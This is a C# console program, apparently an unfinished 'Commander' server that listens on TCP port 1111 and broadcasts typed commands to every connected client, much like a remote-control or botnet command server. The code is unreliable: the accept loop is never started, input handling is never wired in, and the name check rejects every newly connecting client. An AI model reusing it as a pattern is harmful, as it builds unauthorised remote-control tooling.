using System;
using System.Collections.Generic;
using System.Text;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Diagnostics;

namespace Command_Server
{
	class Program
	{
		static Dictionary<string, ClientManager> Clients = new Dictionary<string, ClientManager>();
		static internalcmds internalCmd = new internalcmds();
		static TcpListener Listener = default(TcpListener);
		static void Main(string[] args) {
			EventLog log = new EventLog();
			if (!EventLog.SourceExists("Commander")) {
				EventLog.CreateEventSource("Commander", "test");
			}
			log.Source = "Commander";
			log.Log = "test";
			log.WriteEntry("test");
			Console.ReadKey(true);
			Console.Title = $"Commander [{Clients.Count} clients]";
			Log(logType.Info, "Running server...");
			string hostName = Dns.GetHostName(); // Retrive the Name of HOST  
			Log(logType.Info, $"Host name: {hostName}");
			// Get the IP  
			string myIP = Dns.GetHostByName(hostName).AddressList[0].ToString();
			Log(logType.Info, $"Local ip: {myIP}");

			try {
				Listener = new TcpListener(IPAddress.Parse(myIP), 1111);
			} catch (Exception ex) {
				Log(logType.Error, ex.ToString());
				Console.ReadKey(true);
				Environment.Exit(1);
			}
			Listener.Start();
			Log(logType.Info, $"Tcp listener started on {myIP}:1111");
			Log(logType.Info, "Waiting for a connection...");
		}
		public static void ReadInput(string input) {
			if (input.StartsWith("!")) {
				input = input.Substring(1);
				//internal command
				string commandName = input.Split(' ')[0];
				internalCmd.Do(commandName, input.Substring(commandName.Length));
			} else {
				foreach (ClientManager cm in Clients.Values) {
					cm.Send(input);
				}
				Log(logType.Info, "Command sent to all clients");
			}
		}

		static void server() {

			while (true) {
				Socket s = Listener.AcceptSocket();
				ClientManager newClient = new ClientManager(s);
				newClient.Disconnected += Client_Disconnected;
				Log(logType.Info, $"A client connected from: {s.RemoteEndPoint}");
				Log(logType.Info, string.Format("Computer name: {0}", newClient.ClientInfo));
				string key = newClient.ClientInfo[0].ToLower();
				if (Clients.ContainsKey(key) && !Clients.ContainsKey(newClient.ClientInfo[2].ToLower())) {
					Log(logType.Warning, "Computer name exist, assigning with custom name.");
					if (newClient.ClientInfo[2] != "")
						key = newClient.ClientInfo[2];
					else {
						Log(logType.Error, "No custom name. cannot assign client by a name.");
						newClient.Disconnect(ClientManager.DisconnectReason.internalError);
						continue;
					}
				} else {
					Log(logType.Error, "Same name exists, so cannot assign client. Please change custom name for next time");
					newClient.Disconnect(ClientManager.DisconnectReason.internalError);
					continue;
				}
				Clients[newClient.ClientInfo[0].ToLower()] = newClient;
				Console.Title = $"Commander [{Clients.Count} clients]";
			}
		}

		private static void Client_Disconnected(ClientManager client, ClientManager.DisconnectReason r) {
			if (Clients.ContainsKey(client.ClientInfo[0]))
				Clients.Remove(client.ClientInfo[0]);
			else if (Clients.ContainsKey(client.ClientInfo[2]))
				Clients.Remove(client.ClientInfo[2]);
			Log(logType.Warning, string.Format("Client Disconnected. REASON:[{0}] CLIENT[{1}]", r.ToString().ToUpper(), client.ClientInfo[0]));
		}

		public static void Log(logType type, string text) {
			switch (type) {
			case logType.Info:
				Console.ForegroundColor = ConsoleColor.Cyan;
				break;
			case logType.Warning:
				Console.ForegroundColor = ConsoleColor.Yellow;
				break;
			case logType.Error:
				Console.ForegroundColor = ConsoleColor.Red;
				break;
			}
			Console.WriteLine("[{0}-{1}] {2}", type.ToString().ToUpper(), DateTime.Now, text);
			Console.ResetColor();
		}

		public enum logType
		{
			Info, Warning, Error
		}
	}
}
